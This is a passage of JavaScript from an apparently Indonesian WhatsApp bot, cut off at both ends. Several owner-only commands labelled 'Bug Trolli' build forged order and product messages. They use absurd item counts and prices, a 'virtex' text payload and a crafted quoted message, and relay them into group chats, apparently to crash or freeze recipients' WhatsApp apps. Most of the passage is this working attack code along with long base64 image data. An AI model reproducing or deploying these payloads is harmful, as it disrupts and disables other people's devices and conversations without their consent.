					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!mek.key.fromMe && !isOwner) return
buf = Mfake
imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await dha.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCADIAMgDASIAAhEBAxEB/8QAHAAAAQUBAQEAAAAAAAAAAAAABAADBQYHAgEI/8QAQBAAAgEDAgQDBAgEBAUFAAAAAQIDAAQRBSEGEjFBE1FhByJxgRQyUpGhscHRFSNC4SRDYvAWM2NyojRzgrLi/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAJxEAAgICAgIBBAIDAAAAAAAAAAECEQMxEiEEQRMiMlFhkaEFcYH/2gAMAwEAAhEDEQA/AJmRqFkOdh1rtztTEjd+9MRGXxO9Q0pwSal7vLZABJOwA3p6w4T1a/IIt/AjP9U3u/h1oGOcNXkY0q8sQj+NOT74GQFIx/v41axrVhDbxRyXG+MEsuO1O6FwbbacPEklkmuD1Ye6o+Ary64KsZySGmDHuXzQBO6RKj2MRUho5F5wexBNEtZK8jOsvIW35StB6fBd2NtBbrAkkcKhFxJjIHTqKOFzKN2snz/pZSabVjTGzYSA7SIa8axnHTlPzp1rwEe/bXK/Bc0hqFugwwnX/uib9qVIdsYNrOP8vPwNcNFKv1o2+6iDqNkzZ+liPHYnGfvoDXeJbDSLB7qW5V1H1VRgSx8qKQWxrULyHT7WSe5JjiQZYms81X2msj8um2KMv2536/IfvVP4p4mvuI7xpbuZlt8+5AG91R+pqDDJnlHMR91RQy4z+0TW5GHI1tEPJE/eh/8AjLiB3DG7OP8A2xiq8sSBc7ketd5A+ocfCgC5abx7ewsPp0aMD/Um34VeNG4htdUUGNwJiN0J3rEzIc7tn5Ubp1vf/SEk09iGByMGk+gXZu5ZSobJwd81Fa7fx2VhNO2SFHQd/Sq3YcXIgW3vAIplAByM70Dx/qgl0NBC4bncczA7DairDRRtU1GW9uZJZX5mY+8fL0FAMzSrzHZew8zTOeeTkHfrRC9cge6o2Hma0RLBnHgnI3bqSa9Zg6hvP8DTsqc5OaGaN4ySoyMbigR2p5zg9fhSpRlSRzDHkR2pUAbja6feXn/p7d3H2sYH31MWPCMjnmv5gi/Yj3J+dSeizE6Va8pP1Ox9aPEzg9Wx8aYDen6LZWJDW8Kh/ttu330f4R8wRQouZB32+FOLdsBvj7qACPC9KXhfGmRdnuAa6W7X+paAH1Q46mveU+eflTK3MQ7EV2LmL7X4UAdlT6V4QfgO9ITRnfnWm5powvVT6ZoAi9f1a30mykmuSPcGeUnrXz5xTrc2uak9xJ7sIOEUDAx51O+0nX3vtVkgjcmFTjlB+sao7BnPvH4AVDdlIRYV3CeY9T8hXBXk6iukYnz+QoAKB7An503IT0DN8qUSNIcDp38qe8JYyMjLedACs7cvKC+Wx1zUxbar4RZYlCAbAiouWTkh8NRjO5PemOmw60uN7HdBV1OZZPFY7t1qOurqTkMLNzRE5A8jT4PulT8ai7r3Xxn3e1UlRJ2jcmWHU7UQhPKB5fnQUR5mHkKKVsKp9c0xDwIU79t6ctLZ7p8BSR2puOJpZuRerd607hLQI4bdXkQcx6ZqJzo0hCzOb3SZ7dS3IcDcjFKtf1TTI5oWygzjcUqj5WtlvF+AWHV7y2iWOCbCL0XAOKdHE+ooPrxsB5rUJNMkf1iPhUdc3buuF90YrVswNBfXL6GLneGKRfJVOTRB12VE5ns89Nlk9fhTcHgx6XbXE3NytEhJAz1A7Cibm3UQnAyNvzp9jHE1uJvrW0y/ca6XWLXqRKvxWmvogKjpXJtNsBRTphaDF1a0b/OI+KmnBqFq3S4j+ZxUabId0rg2IH9B+6jsOibWeJx7ksbD0Iqk8ccVwadA0MDCS6cEbdFrriRY7HTXmchFGxJ2rHdQu/pN08h2ycKPIfCpbY0jyWRpJGkcks3UmuUB/pBLdgBRFrZSzMvOCinz61N2dtEHEVvGJGHYdPmazlOjSMGyHj01zF40+AD0XuakLDQ5px4jIVQ+lW3TND5mWa7xJL2GPdUegovW5Bb2awwLhmPIoHc96z+Rs0+NIo9xEiOYoF9xDgnzNRvMWmIHn3qzXlmLS0bb3gNzj7/9+lV/ToTLdHY7b1pGXVmcouwaUlW37U3zHmp69U+PIF7b0Ez43860Rk0ESH3FYdajLz623TrRfPzQMCehoGRuZcHtTGdRbY88GnWcBQM9KGB2yK9D9qCSe0B1e+i8Q9962XRmCwoOmMVgVvM0TiRDgitS4T19Lq3VXcCUdfWsMqafI6MLtUX2UBunlmlTFrMJAPWlUbNDOHJyT1oaSn5NgaGffPlXQcaNZ0NFl0WxLb/yEH4CpC4XmgcDY4OCO1RvCjFuHrE/9MD8alH+qRjrWgFFvNc1O0uIEE+VdypDKD2r2Tii/iBJELfFP2NCcRLh7Vv+tj8DUTeNhDWatIGWCLjS52ElpCw81Yj96kU4sUf82zYeqyZ/SqCDipg75ocmgSHeOtds9T0c2xMlsedW5pMYPXbb51TdP0o3WoBIcCAqG8Qb8yjv99EcQWwu5UichUxztITgIB3/AB6ULpetjR7Jra0iimHMcyyOQTnyA6dPM1Em2utmkaWyfTSwX5nZ3zsqj3c/dU7pmnLAowiqc9BVe0XiqzZgL2Frdzt4medPvHT7qtaXUJHPHIpXA5TnY571zSUl9x1RcXoNJAIUHAA3PlUS3+KuzcLjkjHhwr6+de3c7yYhg2L7MfIV60iQgAEBYlzn1osaREcUMkMCwqdzux8gP71EcOQ87OzD62+3lS1G5N7dOV+qdiT5CndOk+j2c8g645QK01GiNsjo4PGuL18ZVcgVXpwVLDuDV00mDk06Z23J3+Jqn3g/xEo88mtYStsynGkmCByFNDnqacztTb7CtTJngOc1yKVIUEhFoOdyp6EUbp11Jpt8jcxCEgk+lA2XMblAn1jU1daRcSRYjSSWUAMFVSTg/CpdaZcb2jUNB1RJ4kJYc2N8GlVG0OHU7CBJJraeJc8uXQilXLJOLo6VJNWSMo7UM53oiU+tCyEV2HGatwU3Nw3ZeikfiammG3TtUBwC/Nwzb/6WYfjVhPSqQGecUrywQnuJx+tV+9bPKKsnFy/4UHyuF/OqzMjSz4QbDr6VDAYG+cVJpOmMFt6YW35B50POwXIHXzqBpEVxrKPo1ukZ92V2L478oGPzNVkA+AQOg3qxa6hn04d2hk5/kwwfxAqDZeWPB8t6qOh+wOGTw5Qc4Hf1FTejahMZo7eKQgZ9wdgfSoPwyGB6inrUslzG0YJYMMAd6JK0NNpmh2useFF/OQJKdgxoO/1IzoYbc+IzH3iOn31PLY209zc8mHQucxSqNjnseh/Cq3remSWk5a0k8FAccsm2D6VyxSbo6pNpDUgFvEoGC7nGfM0RHGXiSJQdtgv71Bwyuk/iTzr5c7I23wOMCrbongPCZYZEk5epU5x8aqacUTBqQ/dKLXTxHkcxG9Z9eHmvZwOgBq66vcKEYs2yjsapCHxBcTHozcoNPEqthm9ICccrN6VwVLMAK6lPvHHc09ZRl548dc10Wcx7f2ohSMr0IyaBq0TabJNyBkflxgnG5HlXVpw1JqV0LaArEx35n2AApJiaGeCNGOpag08x5LO3HNI/T5Zqwavxp9DJg0S3jESnHiOM83qB+9Seq6THw/wXc21q7OxIMkhGCxJAJ9KzWTONz6VehLsuek+0G/jcfT4YZoP6uUcrAenalVJK8qbdD1pUPsdF8lO9DSUTJQshpEml+zqQ/wDDwBOyyuPyNWkbiqf7Nmzos48p2/8AqtW5TVIbKbxJb/SIJEzy4kDZ+BqGS3AGR071aNVjLNIq78zdKg79JlXkjikA7nlNQ0BDXkgX3U6+YqJl2Jo+7BjHvZB9aYRAyqxqSroFVB4sAbdXbDA9CD2ovingi6tpJJdLXx7Y9I8++v70PdAh4huCWrULO4F1p8M3d0BPx71Em49mkEpdMwRtJv8AxeX6Fc83l4TZ/KrDw1w7crexz3KBXQ5SInfm7E+WK1WaATAhQK50+G3tXEZixLueYjrUSyN9GscSXZFvpzWtkD/Wep9ayHXdTl1LVXlaRzGmUiBOeVR0redWZZLJ8DmK74Hevn+/ga0vJrdwCY3K589+tViSUmTltoGEk0bZV2HqDRdncyxSeJG3hydOZe/oR3FCnpT6JygbjffY1uzBIl7y/jezDXAc8zcrRxtgj1yQdj2+flQptTJDB9EbMBBYF9iDnBJ/Kpzg20tb+S5tb2ESr4XMM9sEfv8AnUnf2VtAyRRRKltF0T7R9TWDkovijZRbXJsoc9k0ExSYjmABAB60Xo0XNcpyjpvT+tktdNIepAAx0FPaTA0cIk3DNWnrszdLRZ0OF6U5G5idXjJVx0IqJVplA99vOuhPOP6s/EUUZljiukvLeWy1A80MwK8x2xVH1jhq/wBOmbELzQA+7Ki5GPUdqmluZhgHl+6pLTdZmtyBK58MbYxkCm5UVFWUWy0e/v5Alvayv5nlIA+J6Uq16C6eYBg4wRnalWXzo6FhbWykymhZDRMvWhJD1rc5TQfZkS2nXqDtMD96/wBquFv4hU+KoV8/0tzbfHAqkeytsxaovk0ZHzDVeY5C0roY3ULjDHGG+G9UgG7OG2kMkkyM0nORnPSiTBZ9jIPlQVvNGkk6PIisJCcE4NEhwRswI9DQB01tbsMc+R5MlDS6RYyK3NBbn1KAUbbwSTkcg2+0egqp+1Th6/n0VrvS7u5JhGZ7dXIV08wB3FAErHwnp90ys1tFyDowz+FE6npVvp9siWKckSbFSc/OqP7HuMeYroeoye8B/hpGPUfYP6Vp+ox+PBImccw2PkamUbRUXTsp6zG25mlH8v03NcJeWOo8whmUumxwcEGnNRhZkKMMMDuKqlzpgWUvHzwyk55l2zXDJ8ej1/Gwxyq7plla3kVyBMxGO5qo8T8InUAZ7RgLodQ2wcfvVi0+W6aPEgDEbcxOC3yo+Es2Sy4og6doxyw7cZGHXenXNlM0d1C8bKce8Nj8D3rqysp7uYRWkLyv5KM4+Nbm8KSxlJEDoTnlYZBoC8uobOPwrZFMnZVAAX41u8tK2cyxd9FRs7Q6Bp7IzKdSnGWPUIOwpCO4vrNbpuUkAhwNsY7inbyB5HZ2y8rn5k0dqVsbLRVt1GWZcPjv5/rU43yfIMq4riUGSN767Y4IjXp8KmYowI0wPhVgsLFbLTvD5VaV8BsjOSev61a9J03TrxDmGAOvu8pXetkrMJMz0IdjXvh+lab/AMMWDKMwxg47MRTL8IWbdEcf9slXxIM78IY3H4UHqV5a2EYNw3vHog3JrvjDXNO0+Z7TRnknuEPK8rEFFPcDz/31qgTzSXEzSTOXc9STSoC5afxlDanlMEvh+WRSqk0qh4ot2aRyyiqRoUxwCaBlY9TRUzbGgZTWhmXn2UuPpWpp5pGcfAn960UVmHsrfGs3i+dvn7mH71poPSqQFE49gVjcyY94Rnf5UZ7OuEjd2sGo6kzi3IBihBI5/U+lWlOH01K9M18oNoB9Q/5n9qsiFI48KoVFGAqjAA8hUqPYx1VCIFRQqgYAA2FcsAV3wR3ryKZZowy9Om9dVQGA+1HhOTQNV/iulKyWUjh8pt4L5/AVevZ9xgvEem/R7twNSgH8wfbH2h+tXfUrO3v7Ke1u41kglUqynvXzlr2nahwLxMk1qzcisWglI2dfsn8jQBul7aiccw92QdD5/GoWaLw25ZkIb8/hRvCuvW3Emkpd2pCy/VlizujdxUnJCsilZFDDyNZzxqRpDI4lWkuBGMRx5+O1CS39woPJGmas0mkwv9Ush8utDHRGztMPmn965niyejojlh7KrLeX8ux91fIbVwkMxAUIWYnYDqauEeiIGBkmLeijFH29pBajMUYDEfWO5NC8eUnchvyIpfSisafpJhX6Rd48QfVTsv8Aembm2+k3Ku4HhR7n1NWm4tzLu2VXue9MPZpgKo90dzXUsaiqRyym5O2V6O1aWTxGGFA90Y3+NP20TQsChYEHIxU0LXB6ZxSS1DZ23p8SbHtPvRMBHLtKP/Kq37Q+LrTR9IuLW1uFfUplKIsbAmPOxY+VSetWAm0u8iDMjFCoZTgjI/vXzhNG0czxuMOrEH4inRJzXhr3vvSoA8pV7SoAvTqztyqCWPQCvTpV8+CltI3far7oNno0djFM0ZeZ0HMS+cHvRxXTCGPhfzOgbmrOXK+i0o+yp8BwT6brUkt3E0UbQsmW88g4/CtQ0lku7j3CHRDlv2qvQrpaLloH5sb4frVt0m3htLRDCnIrkOQTk/7xTg5extQrol17+QobqzKfjRMTK6+7TEq8r5FaEDFo/LPKnbqKIdsd6AVgmpY7MMUcBzHagDhnJHKO9QPF3D1rr2jS2V0oDn3o5Mbo3Y1YSBEpbqaFLmQnIoA+ctHvtQ4D4odLlGwp5ZowdpE8x+YrfNH1G21WxiurR1kgkGVYfl8agfaDwdFxHpxeBVXUYVzE/Tm/0n0rKuBuJrrhPWHstQEi2hflljbrG32h+tAG/mNSOuK8EIx9fFeRTJcW8UsLho5FDKynYg08iEgZoAbEKjq33V7hFGVXf1p4rXnLvQAG6FyC24zS8Eg9Mii+XpXQAIoABSHLHNdpAFfPY0SwCj1NJB71AEffwj6PP61818W2zWvEV/EwxiUn796+n5V8WKUAdGxXz/7XLf6PxfI3LgSxKw/L9KGIpPevDXrUqQHg6Uq9FKgDZuCnD295GVJKsrfeMfpVmjhQoCyY+VVHgJyb+7jzs0YbHwP96uzfVIBxt2pAc2VrFPeRwchIJ94hdgKudygCbDFV/hu1YNLLlmVMAFjkk1ZZRzR7U0MFt5SgGx22xRLkOmRuD0oHZWIpmV5Vy0ZGPs0wObja9hY/axUmJEQEsagZLsyTxJKMMGG/zo6UlsUAO3FxzkBRtXEZwd+9eQR8wJJ716y4NAD+NtqzT2o8FfxWNtS02L/HRjLoo/5ij9a0cMRTiYwWPQUAYd7M+NW02SPSNUbFqXxFI3+Uc/VPp+VbiuCvNnasW9pvB0izXGr6bH7hJeaJR0H2h+tH+yzjczxx6Nqkn85Ri3lY/WH2T6+VAGu4zuK8xvTUEwYU6DQB4wrzFODpXhGBQANKcuB2p1MYGaFmP8wfGlfzGK0Yr9YjA+NAHelsZo3PZmJH31jft5jjj1TTGVTzlJAW7HBXb8a1vS5JI7P8FxWV+3xOX+Bscc5E3Ty9ygDJT19KVIbivM0hHoPWlXi9aVAGqcFSCPXcEgB4mG5+B/StBY4FZtwo/h8RWvk3Mv4GtR0+IXF5Ap3Utk/AUgZNWDG0tkidcZ3PxNSdu4eLbeupIw+zAEUwITbtzR7oeoqgGLpCrZFNsvOnMtHyoJY8jrUcC0LkMPdNAyNnTFzFnGecVJdRQOoApcRsN1yKPU+7mgDyIlTt0p1m8+nnUHxO00FhHcQOyPFKp2OAfQ+nSovVLKS006DVY7mY3bcrMzHY5HYeVYTzOLarR6Hj+Cs0Yyc65Ol/stkeGmCcy82Nlzv91d6hcw2Vvz3EgRPM96r6aelrqmkSvJI15OS8rE9dv70LqV3HNxUy3kck0MC4SJF5t8DtSedpdo0x+BGc6TtU2/8AnXRN2t9Z34P0aRZMbMpG+PhWQe0/gl9Duf4tpCkWDNzMqdYW9PT8q0iNXfX4Lmz0+4t4CvLLzR8o+OPuq0zQR3dpJbzoskTgqynoRV4puadnP5fjxwySjpr+DK+AuPo7q1W21NmF5GMZAz4g8/j51oEOu2L2puPHUIDgg9c/CsB4k0G84e1B7yy51t4piqyL1jYHoavvsv1q21SWb6SIxfKoIQ9+uSo+6pc5tpw0y44cMIyjmtSX9mm6bqdpqCt9FlDFeo6EVzqmqWtgoFxKFYjIUbk/Kq9ofKOKNQZMLGFOQBtnI/vTWisdTvb24mhZvFPKJT0jXuB64xULPJpL27/o6Jf4/HGcpd8Uk/336J4TLMIpEzyuAwyMbGozUbxrrVhZRHCpgNjrnvR9pKlwIZI1KxsPdB8qjtAsWTU9RupM80kxwD2866U7SPLnHjJosUESqqIowqjFYz7f7gPrem2oP/JgLkerN/8AmtthXFfOHtYv/p/Gt+ynKwkQj5Df8c02ZlNXrXrdcivOlI0gD9A0yTWdXttPgkjjlnblVpM8oPrilXOh3p03WbK9XrBMkmPMAgkUqEBdtCbk12xOcZlA+/atWiBiYNGSrDoRWRWT+Fqdo/2ZkP8A5CtdoQE/purq4Ed0Qj9A3Y/tUo8yDuDmqS5G3qadinliAEcjAeXaiwLX4gBJXpTc7wyLlm5TUHHqLDaRM+qnFdnUbf8Arcqe/MtDaWxpXo81B+Zfd7HrUnaxGRFcH3GANQ9xfWbIQLhMntT2i6qnI8KEP4e4x5Uclex8XWhzi6IroUoUFizKAAPWhtft2Oi6facp5pJIoyPlVlhmEqBlPUV0aiWPk2/ydWHyvjjFV9rbKvqzMOLtOUA8ip5bb5/tXGp2F9a63/EtNiE3OOV4871ZnJOwr1RUvCnff7NI+c4cajpU/wBlesf4td6iJ7sG1tVGPBDZ5qJt5buLX3imcG1kjLRjbty5/Opd12ocW8YuWn5SZSoXJPQeQqljr2Zy8lTbuKSqlRFNw+k7apHeLFLZ3hDBOpB33/GsN4p4c1HgnWYrq1kbwefmgmXt/pNfSKHbeo/XNIttWsJbS8jEkTjG46VUYqKpGGTLLI+Utme+zzXYNUFxcmVRfNgyw4xjfqN9x0q2aPpctnJdGCdTBKMxoRnlb1rEuItG1HgfiBJrdm8LmzDL2YfZNbLwBxDa8Q6UZYWVbhMCWLO6H9vWpWKKr9Gr8zLK7e6X8aJeSEW6xBMkJgZPenLRQzSMuxLk0RNHlTneoqG/tbK5Zb2dIFdvdMhwCfLNaaOdtydsmZ3MNpJIQchSa+TNWna6v7m4fPNLKznPqa+r768tXsXKXMLIR1EgI/OsM4j4WfUFmlso0NyZCw7cwz0qJZFFpMcYOSbRm2KXbepa64d1e1J8XT7jHmqcw/Chv4Vf+G7m0nVEGWZkKgD50+SJpgApUqVOxFzmYqeYHcHIrZkYOgdcYYZFKlQA3LzcuVUscjYGvA0pA/ksf/kKVKkB7mTO8LD5im54iyEjO/nSpVll9G2Eh543V6kOHreTxJLvfY+Go8/M0qVYYUuZ0Zn9FlotLgxN/pqXSUSICvQ0qVdxxI9ArvG1KlQAj0rjHpSpUAedOldg5G/lSpUARfEWgWev6fJZ30fMjDZh1U+Yr5/vbfVPZzxaGhfxFQ+63RZk8jSpUAbnw9xDZ6/pMd5Zt7rbMh6o3cGs+9sbkTaPEGwrmViPPHL+9KlUy0VHpld4LszJqcrkAhQF++tOtrUIF2GcUqVcaVybOtukkEEKOwqpe0GZYuH7sjbKFR86VKq9kPRh+PKlSpV1nIf/2Q==",
"itemCount": 1000000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "GUA GK NGERTI",
"message":"entah lah gua nob",
"sellerJid": "6288224859350@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "Rp 25.000.00",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:bugtrol, contextInfo:{}}) 

dha.toggleDisappearingMessages(from, 'Awoakwoakwoak')
dha.relayWAMessage(res)
await limitAdd(sender)
break
case 'plp':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
res = await dha.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
"description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
"buttonText": vipi,
"listType": "SINGLE_SELECT",
"sections": [
{
"title": vipi,
"rows": [
{
"title": "Banned",
"rowId": "Banned"
}
]
}
]
}
}, {quoted:mek})
dha.relayWAMessage(res)
await limitAdd(sender)
break   
case 'pcp':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!mek.key.fromMe && !isOwner) return
buf = Mfake
imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await dha.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "150453297177375",
"title": `Katashi-Botz ~ 404 ${vipi}`,
"description": `${virtex}`,
"currencyCode": "IDR",
"priceAmount1000": "99999999999999999999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "6288224859350@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:bugtrol, contextInfo:{}}) 

dha.relayWAMessage(res)
await limitAdd(sender)
break
// Bug Trolli ( Katashi-Botz )
case 'psp': // BUG TROLLI + BUG GC + TROLLI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!mek.key.fromMe && !isOwner) return
buf = Mfake
imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await dha.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": "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